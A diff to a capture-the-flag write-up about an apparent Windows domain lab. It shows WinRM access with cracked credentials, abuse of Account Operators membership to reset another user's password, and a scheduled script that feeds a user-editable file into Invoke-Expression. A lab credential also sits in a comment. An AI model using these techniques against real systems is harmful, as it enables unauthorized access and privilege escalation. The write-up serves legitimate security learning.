@@ -160,7 +160,7 @@ Now having these credentials I tried to access the shared folders (NOTE: the ser
 
 I started to list the content of the Shared folder:
 
-    smbclient '\\10.10.9.146\shared' -U lilyle --password ChangeMe#1234 -t 120
+    smbclient '\\10.10.9.146\shared' -U lilyle --password XXXXXX#nnnn  -t 120
     ...
     smb: \> ls
       .                                   D        0  Sat May 30 02:45:42 2020
@@ -232,11 +232,151 @@ Then we can try to reverse the hashed value:
 
 <!-- buse\uzunLM+3131 -->
   
+With the newly discovered credentials I tried to login through RDP, but the user has not be granted to the permissions to access the server. Since winrm service is available (5985)
+
+    nmap -p 5985 -Pn -sVC 10.10.9.146
+    PORT     STATE SERVICE VERSION
+    5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-title: Not Found
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+
+We can try to use this service:
+
+    evil-winrm -i 10.10.9.146 -u buse               
+    Enter Password:                                       
+    Evil-WinRM shell v3.5
+    ...
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\buse\Documents> 
+
+I executed the usual command to verify users permissions:
+
+    *Evil-WinRM* PS C:\Users\buse\desktop> whoami /all
+
+    USER INFORMATION
+    ----------------
+    
+    User Name     SID
+    ============= ============================================
+    windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
+    
+    
+    GROUP INFORMATION
+    -----------------
+    
+    Group Name                                  Type             SID                                          Attributes
+    =========================================== ================ ============================================ ==================================================
+    Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+    WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+    
+    
+    PRIVILEGES INFORMATION
+    ----------------------
+    
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+    
+    
+    USER CLAIMS INFORMATION
+    -----------------------
+    User claims unknown.
+    
+    Kerberos support for Dynamic Access Control on this device has been disabled.
+
+ Here an interesting privileges emerged:
+
+         BUILTIN\Account Operators
+
+Since our current user is a member of this security group we can modify other user accounts. More information can be found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators).
+Further I proceed to fingerprint the server:
+
+    Get-ComputerInfo
+    WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
+    WindowsCurrentVersion                                   : 6.3
+    WindowsEditionId                                        : ServerStandard
+    WindowsInstallationType                                 : Server
+    WindowsInstallDateFromRegistry                          : 4/30/2020 2:35:29 PM
+    WindowsProductId                                        : 00429-70000-00000-AA211
+    WindowsProductName                                      : Windows Server 2019 Standard
+    WindowsRegisteredOrganization                           :
+    WindowsRegisteredOwner                                  : Windows User
+    WindowsSystemRoot                                       : C:\Windows
+    WindowsVersion                                          : 1809
+    ...
+
+Testing AMSI it seems not enabled:
+
+    *Evil-WinRM* PS C:\Users\buse\desktop> "invoke-mimikatz"
+    invoke-mimikatz
+
+But since we are using remote powershell, we cannot execute most of the commands to check paths to privilege escalation, e.g.
+
+    Get-ScheduledTask
+    Cannot connect to CIM server. Access denied 
+    
+ Since CIM session only works for members of the built in administrators group remotely.
+ After a while looking around I found an interesting folder, C:\scripts:
+
+     C:\scripts> dir
+    Directory: C:\scripts
+
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    -a----         5/3/2020   5:53 AM           4119 checkservers.ps1
+    -a----         7/1/2024   7:42 AM             31 log.txt
+
+Inspecting the log file:
+
+    type log.txt
+    Last run: 07/01/2024 07:52:21
+    *Evil-WinRM* PS C:\scripts> type log.txt
+    Last run: 07/01/2024 07:53:14
+
+We can see that the file runs every minute. Inspecting the source of checkservers, we notice that for each line in file C:\Users\brittanycr\hosts.txt the Test-connection cmdlet is executed against the retrived value from the file (if the row is not a comment):
+
+    get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
+    ForEach-Object {
+        $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
+        Invoke-Expression $p
+
+Hoping that the task is scheduled to run as system (indeed a very bad configuration) and since we could change the password for other users, as we are members of BUILTIN\Account Operators group. First we can proceed to change brittanycr password:
+
+       *Evil-WinRM* PS C:\scripts> net user brittanycr Pwd12345 /domain
+        The command completed successfully.
+At this point I thought to use Evil-WinRM again to login as brittanycr, but eventually I got this error:
+
+    Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+At this point I tried to access the Users shared folder as brittanycr (note that the server IP is changed again):
+
+    smbclient '\\10.10.119.17\users' -U brittanycr --password Pwd12345 -t 120
+    smb: \> cd brittanycr
+    smb: \brittanycr\> ls
+     ..
+    hosts.txt                           A       22  Sun May  3 15:44:57 2020
+    smb: \brittanycr\> get hosts.txt 
+    getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+    
 
 
     
 
-  
+
+     
 
 
   
